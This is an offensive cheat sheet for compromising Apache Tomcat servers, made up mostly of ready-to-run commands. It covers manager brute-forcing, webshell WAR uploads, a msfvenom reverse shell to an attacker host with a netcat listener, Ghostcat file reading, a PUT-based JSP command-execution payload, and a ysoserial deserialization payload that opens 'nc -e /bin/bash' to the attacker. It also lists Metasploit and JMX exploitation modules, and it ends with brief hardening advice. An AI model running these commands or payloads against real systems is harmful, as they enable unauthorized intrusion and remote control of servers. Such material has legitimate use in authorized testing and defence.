# Attacking Tomcat

## 1. Tomcat Manager Brute Force

```bash
msf6 > use auxiliary/scanner/http/tomcat_mgr_login
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RHOSTS <target_ip>
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT <target_port>
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST <target_vhost>
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set STOP_ON_SUCCESS true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt
msf6 auxiliary(scanner/http/tomcat_mgr_login) > run
```

```bash
python3 mgr_brute.py -U http://<target>:<port>/ -P /manager \
-u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt \
-p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
```

---

## 2. WAR File Upload (After Login)

```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp
```

**Reverse Shell Payload**

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f war > backup.war
nc -lnvp <attacker_port>
```

Upload via `/manager/html` and access:

```bash
http://<target>:<port>/shell.jsp
```

---

## 3. CVE-2020-1938 — Ghostcat (AJP LFI Exploit)

```bash
nmap -sV -p 8009,8080 <target_ip>
python2.7 tomcat-ajp.lfi.py <target_ip> -p 8009 -f WEB-INF/web.xml
```

Exploits AJP to read arbitrary files, including sensitive configurations.

---

## 4. CVE-2009-3548 — Deployment Bypass

```bash
curl -T shell.war http://<target_ip>:8080/manager/deploy?path=/shell
```

Allows WAR upload without authentication on outdated Tomcat versions.

---

## 5. CVE-2017-12617 — Arbitrary JSP Upload via PUT

```bash
curl -v -X PUT -d '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>' \
http://<target>:8080/shell.jsp
```

Uploads and executes arbitrary JSP files, achieving RCE.

---

## 6. Weak Configuration Exploitation

```bash
curl -u admin:admin http://<target>:8080/manager/html
```

Check for common default credentials like `admin:admin` or `tomcat:tomcat`.

---

## 7. CVE-2020-9484 — Deserialization RCE

```bash
ysoserial -g CommonsCollections6 -o raw -c "nc -e /bin/bash <attacker_ip> <port>" > payload.ser
curl -X POST -H "Content-Type: application/x-java-serialized-object" \
--data-binary @payload.ser http://<target>:8080
```

Exploits insecure Java deserialization in persistent sessions for remote code execution.

---

## 8. Metasploit: JSP Upload via RCE

```bash
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS <target_ip>
set USERNAME admin
set PASSWORD admin
run
```

Deploys a JSP webshell automatically through the Manager interface.

---

## 9. CVE-2016-8735 — JMX RMI Exploitation

```bash
msfconsole
use exploit/multi/misc/java_jmx_server
set RHOST <target_ip>
set RPORT 1099
run
```

Targets exposed JMX RMI services for remote execution.

---

## 10. Tomcat JMX Enumeration

```bash
java -jar jmxterm-1.0-alpha-4-uber.jar --url service:jmx:rmi:///jndi/rmi://<target_ip>:<port>/jmxrmi
```

Enumerates and interacts with MBeans to identify potential RCE opportunities.

---

## 11. Connector Misconfigurations
* **AJP Connector (Port 8009):** May expose internal files via Ghostcat or allow internal resource access.
* **HTTP Connector:** Misconfigurations could permit authentication bypass or proxy access.

---

## 12. Post-Exploitation and Hardening Insights

### Common Attack Vectors
* `/manager` and `/host-manager` interfaces frequently lead to full system compromise.
* Default credentials and weak authentication remain widespread.
* Ghostcat (CVE-2020-1938) exposes sensitive files.
* WAR deployments are effective for persistent access.
* JMX misconfigurations can result in arbitrary code execution.

### Security Recommendations
* Restrict access to management interfaces.
* Disable or secure AJP and JMX connectors.
* Use strong, unique credentials.
* Regularly update Tomcat and review security advisories.
* Employ obfuscated or encrypted webshells only for authorized penetration testing.
